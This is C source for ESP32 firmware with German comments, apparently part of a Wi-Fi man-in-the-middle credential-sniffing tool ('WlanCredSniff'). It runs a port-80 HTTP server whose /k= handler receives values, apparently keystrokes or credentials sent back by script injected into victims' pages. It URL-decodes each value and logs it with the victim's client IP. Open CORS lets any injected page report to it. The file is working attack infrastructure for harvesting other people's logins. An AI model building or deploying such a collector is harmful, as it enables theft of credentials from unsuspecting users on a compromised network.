#include "wlan_mitm_server.h"
#include "wlan_cred_sniff.h"

#include <esp_http_server.h>
#include <esp_log.h>
#include <lwip/sockets.h>
#include <string.h>

#define TAG "WlanMitmServer"

static httpd_handle_t s_server = NULL;
static struct WlanCredSniff* s_cs = NULL;

// ---------------------------------------------------------------------------
// kleine URL-Decode-Helper (% + +) für den Pfad nach /k=
// ---------------------------------------------------------------------------

static int hex_val(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static void url_decode(const char* in, char* out, int out_max) {
    int i = 0, o = 0;
    while(in[i] && o < out_max - 1) {
        if(in[i] == '%' && in[i + 1] && in[i + 2]) {
            int h = hex_val(in[i + 1]);
            int l = hex_val(in[i + 2]);
            if(h >= 0 && l >= 0) {
                uint8_t v = (uint8_t)((h << 4) | l);
                out[o++] = (v >= 0x20 && v < 0x7f) ? (char)v : '?';
                i += 3;
                continue;
            }
        }
        if(in[i] == '+') {
            out[o++] = ' ';
            i++;
        } else {
            uint8_t c = (uint8_t)in[i++];
            out[o++] = (c >= 0x20 && c < 0x7f) ? (char)c : '?';
        }
    }
    out[o] = 0;
}

static uint32_t get_client_ip(httpd_req_t* req) {
    int sockfd = httpd_req_to_sockfd(req);
    if(sockfd < 0) return 0;
    struct sockaddr_in6 addr;
    socklen_t addr_size = sizeof(addr);
    if(getpeername(sockfd, (struct sockaddr*)&addr, &addr_size) != 0) return 0;
    if(addr.sin6_family == AF_INET6) {
        // IPv4-mapped IPv6 (::ffff:a.b.c.d): letzte 4 Bytes sind die v4-IP.
        if(IN6_IS_ADDR_V4MAPPED(&addr.sin6_addr)) {
            uint32_t v4;
            memcpy(&v4, &addr.sin6_addr.s6_addr[12], 4);
            return v4;
        }
        return 0;
    }
    struct sockaddr_in* v4 = (struct sockaddr_in*)(void*)&addr;
    return v4->sin_addr.s_addr;
}

// ---------------------------------------------------------------------------
// /k=<value> Handler
// ---------------------------------------------------------------------------

static esp_err_t handler_k(httpd_req_t* req) {
    const char* uri = req->uri;
    if(strncmp(uri, "/k=", 3) != 0) {
        httpd_resp_send_404(req);
        return ESP_OK;
    }
    const char* raw_value = uri + 3;
    // Bis ? oder # oder Ende — alles dahinter (Query-String, Fragment) ignorieren.
    char clean[128];
    int i = 0;
    while(raw_value[i] && raw_value[i] != '?' && raw_value[i] != '#' &&
          i < (int)sizeof(clean) - 1) {
        clean[i] = raw_value[i];
        i++;
    }
    clean[i] = 0;

    char decoded[128];
    url_decode(clean, decoded, sizeof(decoded));

    if(s_cs && decoded[0]) {
        uint32_t client_ip = get_client_ip(req);
        wlan_cred_sniff_push_log(s_cs, client_ip, decoded);
        ESP_LOGI(TAG, "LOG event: '%s'", decoded);
    }

    httpd_resp_set_type(req, "text/plain");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_sendstr(req, "ok");
    return ESP_OK;
}

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------

void wlan_mitm_server_start(struct WlanCredSniff* cs) {
    if(s_server) return;
    s_cs = cs;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    // Wildcard-Matcher, damit /k=* alles unter /k= matched.
    config.uri_match_fn = httpd_uri_match_wildcard;
    // Wir brauchen nur einen URI-Handler, aber paar Sockets reserviert lassen
    // damit parallele Inject-Callbacks gleichzeitig funktionieren.
    config.max_uri_handlers = 4;
    config.max_open_sockets = 4;
    config.lru_purge_enable = true;
    if(httpd_start(&s_server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "httpd_start failed");
        s_server = NULL;
        s_cs = NULL;
        return;
    }
    httpd_uri_t uri = {
        .uri = "/k=*",
        .method = HTTP_GET,
        .handler = handler_k,
        .user_ctx = NULL,
    };
    if(httpd_register_uri_handler(s_server, &uri) != ESP_OK) {
        ESP_LOGW(TAG, "register handler failed");
    }
    ESP_LOGI(TAG, "started on :80");
}

void wlan_mitm_server_stop(void) {
    if(s_server) {
        httpd_stop(s_server);
        s_server = NULL;
        ESP_LOGI(TAG, "stopped");
    }
    s_cs = NULL;
}

bool wlan_mitm_server_running(void) {
    return s_server != NULL;
}
